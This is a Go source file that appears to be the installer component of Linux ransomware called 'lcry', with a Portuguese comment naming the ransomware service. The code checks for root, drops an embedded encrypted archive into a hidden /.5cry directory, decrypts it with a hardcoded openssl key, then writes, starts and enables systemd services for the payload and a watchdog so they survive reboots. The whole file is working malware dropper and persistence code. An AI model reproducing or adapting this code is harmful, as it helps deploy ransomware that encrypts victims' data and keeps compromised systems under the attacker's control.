package core

import (
	"assets"
	"fmt"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

// IsRoot -> verify user uid.
func IsRoot() bool {
	if os.Geteuid() == 0 {
		return true
	}

	return false
}

func extractEncryptedFiles(malwaredWD string) {
	encFiles := filepath.Join(malwaredWD, "lcry.tgz")

	defer os.Remove(encFiles)

	const decryptorKey = "lcryptor"
	decFiles := filepath.Join(malwaredWD, "lcry.dec.tgz")

	defer os.Remove(decFiles)

	commandString := fmt.Sprintf(`openssl enc -pbkdf2 -d -aes256 -pass pass:%s -in %s -out %s`, decryptorKey, encFiles, decFiles)
	commandSlice := strings.Fields(commandString)

	cmd := exec.Command(commandSlice[0], commandSlice[1:]...)

	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}

	commandString = fmt.Sprintf(`tar -C %s -xpvf %s`, malwaredWD, decFiles)
	commandSlice = strings.Fields(commandString)

	cmd = exec.Command(commandSlice[0], commandSlice[1:]...)

	if err := cmd.Run(); err != nil {
		log.Fatal(err)
	}
}

// MountAssets -> creates a tmp dir, and extracts the payload here.
func MountAssets(dstTarget string) {
    malwarePath := filepath.Join("/", ".5cry")

    if _, err := os.Stat(malwarePath); os.IsNotExist(err) {
        os.Mkdir(malwarePath, 555)
    }

	encryptedFilesPath := filepath.Join(malwarePath, "lcry.tgz")

	if err := ioutil.WriteFile(encryptedFilesPath, (*assets.Lcry), 0744); err != nil {
		fmt.Println("ERR 2")
		log.Fatal(err)
	}

	extractEncryptedFiles(malwarePath)
	env := fmt.Sprintf("HOME=%s", dstTarget)
	mainPayload := filepath.Join(malwarePath, "winner.lcry")
    monitor := filepath.Join(malwarePath, "moon.lcry")

    // serviço do monitor
    monitorService := fmt.Sprintf("[Unit]\nDescription=monitor\n\n[Service]\nType=simple\nExecStart=+%s\nRemainAfterExit=yes\nRestartPreventExitStatus=0\nStandardError=syslog\nStandardOutput=syslog\nEnvironment=%s\n\n[Install]\nWantedBy=multi-user.target\n", monitor, env)

    // serviço do ransomware, talvez acrescentar um execStartPrev para monitorar o moon.lcry
	malwareService := fmt.Sprintf("[Unit]\nDescription=lcry\nAfter=network.target\n\n[Service]\nType=simple\nExecStart=+%s\nRemainAfterExit=yes\nRestartPreventExitStatus=0\nStandardError=syslog\nStandardOutput=syslog\nEnvironment=%s\n\n[Install]\nWantedBy=multi-user.target\n", mainPayload, env)

    malwareServicePath := filepath.Join("/etc/systemd/system/", "lcry.service")
    monitorServicePath := filepath.Join("/etc/systemd/system", "monitor.service")

	systemd, err := os.OpenFile(malwareServicePath, os.O_CREATE|os.O_WRONLY|syscall.O_CLOEXEC, 0640)

	if err != nil {
		fmt.Println("ERR 3")
		log.Fatal(err)
	}

	defer systemd.Close()

	systemd.Write([]byte(malwareService))

	argvs := []string{"systemctl", "start", "lcry.service"}
    systemctlEnv := []string{"HOME=" + dstTarget}

    _, err = syscall.ForkExec("/bin/systemctl", argvs, &syscall.ProcAttr{Env: systemctlEnv})

	if err != nil {
		fmt.Println("ERR 4")
		log.Fatal(err)
	}

    monitorSysD, err := os.OpenFile(monitorServicePath, os.O_CREATE|os.O_WRONLY|syscall.O_CLOEXEC, 0640)

    if err != nil {
        fmt.Println("ERR 5")
        log.Fatal(err)
    }

    defer monitorSysD.Close()

    monitorSysD.Write([]byte(monitorService))

    argvs = []string{"systemctl", "start", "monitor.service"}

    _, err = syscall.ForkExec("/bin/systemctl", argvs, &syscall.ProcAttr{Env: systemctlEnv})

    if err != nil {
        fmt.Println("Err 6")
        log.Fatal(err)
    }

    persist()
}

func persist() {
    cmd := exec.Command("/bin/systemctl", "enable", "lcry")

    if err := cmd.Run(); err != nil {
        log.Fatal(err)
    }

    cmd2 := exec.Command("/bin/systemctl", "enable", "monitor")

    if err := cmd2.Run(); err != nil {
        log.Fatal(err)
    }
}
